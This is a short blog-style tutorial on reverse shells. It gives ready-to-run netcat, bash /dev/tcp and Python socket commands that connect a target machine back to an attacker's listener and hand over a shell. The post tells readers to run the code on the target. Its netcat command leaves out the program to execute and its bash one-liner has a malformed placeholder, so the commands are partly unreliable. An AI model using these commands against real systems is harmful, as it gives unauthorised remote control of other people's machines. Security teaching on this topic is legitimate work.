+++
title = "Reverse Shell"
cover = "/images/b1/shell.jpg"
coverCaption = ""
tags = ["shell", "cybersecurity", "rce"]
keywords = ["reverse", "shell", "hacking"]
description = "A brief Introduction to Reverse Shell and its useage."
showFullContent = false
readingTime = false
hideComments = false
color = "orange" #color from the theme settings
toc = false
+++
# What is a Reverse Shell?
A reverse shell is a type of shell where the target machine initiates a connection to the attacker's machine, bypassing firewall restrictions that might block incoming connections. This method is widely used in penetration testing and malicious attacks to gain remote control access of the targets system.

## How does Reverse shell works?
The attacker sets up a listener on their machine. Once the target's machine is exploited, the attacker execute a command that starts an outbound connection to the machine.Then the attacker receives the connection and gain remote access to executes commands on the target's machine.

## Some Common Reverse Shell Method:
Reverse shell can be established using various programming languages and tools. Here I will show you some of the commonly used methods.

1. **Netcat (nc)**  
  Netcat is simple yet very powerful networking tool that can be used for reverse shells. This is how you can get reverse shell using netcat.  
  On the attacker machine set up netcat listener using:  
  ```nc -lvnp <Port>```  
  On the Target's machine execute the following command:  
  ```nc.traditional -e <Lhost_IP> <Port>```  
  _Output:_
  ![Using Netcat](/images/b1/nc.png)  

2. **Bash Reverse Shell**  
  A bash one liner can be used to establish a reverse shell.  
  ```bash -i >& /dev/tcp/<Lhost_IP/<Port> 0>&1```  
  Make sure to setup netcat listener before executing the command.  
  _Output:_
  ![Using Bash](/images/b1/bash.png)  

3. **Python Reverse Shell**  
  Python is most used language for crafting tools among hackers. Copy the script below and run it on the target machine using python3.  
  ``` Python
  import socket,subprocess,os
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(("<Lhost_IP>",4444))
  os.dup2(s.fileno(),0)
  os.dup2(s.fileno(),1)
  os.dup2(s.fileno(),2)
  import pty
  pty.spawn("/bin/bash")
  ```
  _Output:_
  ![Using python](/images/b1/py.png)  

## Final Thoughts!
Reverse shells are a powerful tool in both penetration testing and cyberattacks. Understanding how they works is important for both offensive and 
defensive cybersecurity. While attackers use them to gain access, security professionals must implement proper measures to detect and prevent these threats.
